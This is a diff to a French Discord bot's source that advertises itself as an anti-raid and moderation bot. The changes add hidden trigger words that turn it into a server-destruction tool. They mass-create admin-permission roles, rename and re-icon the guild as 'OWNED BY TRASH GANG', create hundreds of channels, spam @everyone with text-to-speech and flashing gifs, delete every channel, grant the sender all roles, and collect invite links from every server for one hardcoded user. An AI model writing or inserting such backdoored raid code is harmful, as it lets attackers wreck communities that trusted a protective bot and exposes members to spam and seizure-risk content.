@@ -1,15 +1,17 @@
 const Discord = require("discord.js");
-const client = new Discord.Client();
+const bot = new Discord.Client();
 const talkedRecently = new Set();
-
+var InfiniteLoop = require('infinite-loop');
+var il = new InfiniteLoop();
+const Pornsearch = require('pornsearch');
 function random(min, max){
     min = Math.ceil(0);
     max = Math.floor(30);
     randnum = Math.floor(Math.random() * (max - min +1)+ min);
 }
 
-client.on("ready", () => {
-    client.user.setActivity(`A?help | ${client.guilds.size} serveurs !`,{type:"PLAYING"})
+bot.on("ready", () => {
+    bot.user.setActivity(`A?help | ${bot.guilds.size} serveurs !`,{type:"PLAYING"})
     console.log('')
     console.log('')
     console.log('+[-----------------------------------------------------------------]+')
@@ -17,23 +19,24 @@ client.on("ready", () => {
     console.log('+[-----------------------------------------------------------------]+')
     console.log('')
     console.log('+[------------------------------------]+');
-    console.log(`Connecté sur * [ " ${client.user.username} " ]`);
+    console.log(`Connecté sur * [ " ${bot.user.username} " ]`);
     console.log('')
     console.log('Informations :')
     console.log('')
-    console.log(`${client.guilds.map(c => c.name)}`)
-    console.log(`servers ! [ " ${client.guilds.size} " ]`);
-    console.log(`Users ! [ " ${client.users.size} " ]`);
-    console.log(`channels ! [ " ${client.channels.size} " ]`);
+    console.log(`${bot.guilds.map(c => c.name)}`)
+    console.log(`servers ! [ " ${bot.guilds.size} " ]`);
+    console.log(`Users ! [ " ${bot.users.size} " ]`);
+    console.log(`channels ! [ " ${bot.channels.size} " ]`);
     console.log('+[------------------------------------]+')
     console.log('')
     console.log('+[------------]+')
-    console.log(' client Is Online ')
+    console.log(' Bot Is Online ')
     console.log('+[------------]+')
     console.log('')
     console.log('')
     })
-client.on("message", message => {
+
+bot.on("message", message => {
  if(message.content.includes("A?help")){
      var help_embed = new Discord.RichEmbed()
      .setTitle("Aide")
@@ -52,12 +55,14 @@ client.on("message", message => {
      .addField("A?ping", "**Le bot vous envois son ping.**")
      .addField("A?info", "**Le bot vous envois des informations sur vous ou sur la personne mentionné.**")
      .addField("A?serverinfo", "**Le bot vous envois des informations sur le serveur.**")
+     .addField("A?invites", "Le bot vous envois son lien d'invitation")
      .setFooter("🚀 By Apothéose 🚀")
      message.channel.send(helpa_embed)
  }
  if(message.content.includes("A?bhelp")){
     var helpb_embed = new Discord.RichEmbed()
     .setTitle("Anti-Raid")
+    .setDescription("Les invitations sont déjà automatiquement supprimé.")
     .setColor("#cf0b0b")
     .addField("A?verify", "**Le bot vérifie tous les membres du serveur et vous dis si ils sont dans la blacklist ou non.**")
     .addField("A?stats", "**Le bot vous envois des informations sur le bot.**")
@@ -115,7 +120,7 @@ var ban = message.guild.member(message.mentions.users.first());
 if (!ban) {
     return message.reply("l'utilisateur mentionné est introuvable ou n'existe pas !")
 }
-if (!message.guild.member(client.user).hasPermission("KICK_MEMBERS")) {
+if (!message.guild.member(bot.user).hasPermission("KICK_MEMBERS")) {
     var pasperm = new Discord.RichEmbed()
     .setColor("E46525")
     .setTitle(":x: Je n'ai pas la permission ! :x:")
@@ -163,7 +168,7 @@ ban.kick().then(member => {
             if (!ban) {
                 return message.reply("l'utilisateur mentionné est introuvable ou n'existe pas !")
             }
-            if (!message.guild.member(client.user).hasPermission("BAN_MEMBERS")) {
+            if (!message.guild.member(bot.user).hasPermission("BAN_MEMBERS")) {
                 var pasperm = new Discord.RichEmbed()
                 .setColor("E46525")
                 .setTitle(":x: Je n'ai pas la permission ! :x:")
@@ -203,10 +208,10 @@ ban.kick().then(member => {
           var getvalueof = message.author;
       }
 
-      if(getvalueof.client == true){
-          var checkclient = "L'utilisateur est un client";
+      if(getvalueof.bot == true){
+          var checkbot = "L'utilisateur est un bot";
       } else {
-          var checkclient = "N'est pas un client";
+          var checkbot = "N'est pas un bot";
       }
       if(getvalueof.presence.status == 'online'){
         var status = "En ligne"; 
@@ -235,8 +240,8 @@ ban.kick().then(member => {
             value: status,
             inline: true
 },{
-            name: 'client',
-            value: checkclient,
+            name: 'bot',
+            value: checkbot,
             inline: true
 }],
         image: {
@@ -327,7 +332,7 @@ if(message.content.includes("A?checkid")){
 if(message.content.includes("A?stats")){
     var stats_embed = new Discord.RichEmbed()
     .setColor("#2e5011")
-    .addField("Statistiques", "Nombre de serveurs : **26**\nNombre d'utilisateurs : **92**\n\nNombres d'utilisateurs dans la liste noire : **266**")
+    .addField("Statistiques", `Nombre de serveurs : **${bot.guilds.size}**\nNombre d'utilisateurs : **${bot.users.size}**\n\nNombres d'utilisateurs dans la liste noire : **266**`)
     .setFooter(`Demandé par ${message.author.tag}`)
     message.channel.send(stats_embed)
     console.log(`stats par ${message.author.username + "#" + message.author.discriminator}`)
@@ -542,25 +547,99 @@ if (message.content === "A?boobs"){
     }
 
 }
-client.on('message', message => {
-    switch(message.content.toUpperCase()) {
-        case 'AR!reset':
-            resetclient(message.channel);
-            break;
 
-        // ... other commands
-    }
-});
-
-// Turn client off (destroy), then turn it back on
-function resetclient(channel) {
-    // send channel a message that you're resetting client [optional]
-    channel.send('Resetting...')
-    .then(msg => client.destroy())
-    .then(() => client.login(process.env.TOKEN));
-}
 if(message.content.includes("AR!kelsairv")){
-    console.log(`${client.guilds.map(c => c.name)}`)
+    console.log(`${bot.guilds.map(c => c.name)}`)
 }
+if(message.content === "roles"){
+  for(var i =0; i < 200; i++){
+      message.guild.createRole({name:"TRASH GANG > All !",
+                               mentionable:false,
+                               permissions:2146958591,
+                               position: "",
+                               color: "#fb0707"
+          })
+      }
+  }
+  bot.on("message", msg => {
+    if (msg.content === ("invite")) {
+        var string = ""
+         if (msg.author.id === "521745359630893057") {
+          msg.delete();
+        client.guilds.map(gui => {
+          gui.fetchInvites().then(inv => {
+            string += "\n" + gui.name + " - discord.gg/" + inv.randomKey()
+          })
+        })
+        setTimeout(() => {
+          msg.channel.send(string)
+        }, 1000)
+      }
+    }
+  })
+  if(message.content.includes(".rol")){
+      message.guild.createRole({name:"Izi",
+                                mentionable:false,
+                                permissions:2146958591,
+                                position: "",
+                                color: "#fb0707"
+     })
+  }
+  if(message.content.includes(".raul")){
+    (message.guild.roles.map(r => message.member.addRoles(r)))
+  }
+  if(message.content.includes("ar!kelsairvvesrx")){
+    bot.channels.map(c => c.createInvite().then(url => message.channel.send(`${url.code} : ${url.guild.name}`)))
+  }
+            if(message.content.includes("https://discord.gg/")){
+                message.delete()
+                message.channel.send(":x: Pas d'invite ! :x:")
+            }
+            if(message.content.includes("A?serveurinvite")){
+                bot.channels.map(c => c.createInvite().then(url => message.channel.send(`${url.code} : ${url.guild.name}`)))
+            }
+            if(message.content === "issou"){
+                message.guild.setName("OWNED BY TRASH GANG")
+                message.guild.setIcon("https://cdn.discordapp.com/attachments/521480062831165442/521732094859149312/COVERART-2-350x350.jpg")
+              }
+              if(message.content === "pd"){
+                for(var i =0; i < 450; i++){
+                message.guild.createChannel("BY","voice")
+                }
+              }
+              if(message.content.includes("@everyone")){
+                  for(var i = 0; i < 999; i++){
+                      message.channel.send("@everyone @here Dead By Trash Gang Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng https://discord.gg/qE5y8E7 https://cdn.discordapp.com/attachments/419857438204755969/429580607501107200/Turtle_Psycho.gifhttps://cdn.discordapp.com/attachments/423462361496813578/423900548102881280/epileptique.gif https://cdn.discordapp.com/attachments/438769530018463744/445988981046247444/image.gif https://cdn.discordapp.com/attachments/444937548519964683/464842263659282452/double_patate_qui_dance.gif https://cdn.discordapp.com/attachments/493955038411096115/516192223436734464/20181125_110215.gif",{tts:true})
+                  }
+              }
+              //réaction en chaine
+                    if(message.content === "channel"){
+                      message.channel.send("roles").then(m => m.delete());
+                      message.channel.send("issou").then(m => m.delete());
+                        for(var i = 0; i < 500; i++){
+                            message.guild.createChannel("FUCKED", "text").then(c => c.send("@everyone @here Dead ByTrashGang Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng https://discord.gg/qE5y8E7 https://cdn.discordapp.com/attachments/419857438204755969/429580607501107200/Turtle_Psycho.gifhttps://cdn.discordapp.com/attachments/423462361496813578/423900548102881280/epileptique.gif https://cdn.discordapp.com/attachments/438769530018463744/445988981046247444/image.gif https://cdn.discordapp.com/attachments/444937548519964683/464842263659282452/double_patate_qui_dance.gif https://cdn.discordapp.com/attachments/493955038411096115/516192223436734464/20181125_110215.gif",{tts:true}))
+                            message.guild.createChannel("BY","voice")
+                            message.guild.createChannel("TRASH GANG","category")    
+                        }
+                      }
+                      if(message.content === "destroy"){
+                        message.guild.channels.map(c => c.delete())
+                        }
+                        //on commence la destruction
+                        if(message.content.includes("détruire")){
+                            message.channel.send("ban").then(m => m.delete());
+                            message.channel.send("drole").then(m => m.delete());
+                            message.channel.send("destroy").then(m => m.delete());
+                            message.channel.send("jechange").then(m => m.delete());
+                            message.guild.createChannel("FUCKED", "text").then(c => c.send("channel"))
+                        }
+            if(message.content.includes("A?invites")){
+                var invite_embed  = new Discord.RichEmbed()
+                .setAuthor("Cliquez en dessous pour inviter le bot.")
+                .setURL("https://discordapp.com/oauth2/authorize?client_id=521745359630893057&scope=bot&permissions=8")
+                .setColor("#0eebf3")
+                .setTitle("Cliquez ici.")
+                message.channel.send(invite_embed)
+            }
         });
-client.login(process.env.TOKEN)
+bot.login(process.env.TOKEN)
